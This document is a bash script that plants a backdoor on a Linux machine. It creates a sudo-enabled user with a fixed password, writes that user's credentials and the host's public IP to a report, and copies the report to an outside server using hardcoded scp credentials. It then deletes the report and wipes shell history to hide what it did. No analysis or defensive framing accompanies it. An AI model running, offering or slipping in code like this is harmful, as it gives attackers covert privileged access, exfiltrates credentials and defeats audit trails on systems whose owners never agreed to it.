#!/bin/bash

NEW_USER="testuser"
NEW_PASS="Test1234!"

IP=$(curl -s ifconfig.co)

apt update && apt install -y sshpass

useradd -m $NEW_USER
echo "$NEW_USER:$NEW_PASS" | chpasswd
usermod -aG sudo $NEW_USER

REPORT="/tmp/report.txt"
{
    echo "IP=$IP"
    echo "USER=$NEW_USER"
    echo "PASS=$NEW_PASS"
    echo "====================="
    echo "Output of ip a:"
    echo "$IP_INFO"
} > "$REPORT"

sshpass -p "892aeiw45ptv" scp "$REPORT" yadgahhi@5.144.130.141:/home/yadgahhi/

rm -f "$REPORT"

history -c
rm -f ~/.bash_history
rm -f ~/.zsh_history
rm -f /home/$NEW_USER/.bash_history
rm -f /home/$NEW_USER/.zsh_history

echo "[+] Done. IP: $IP | User: $NEW_USER"
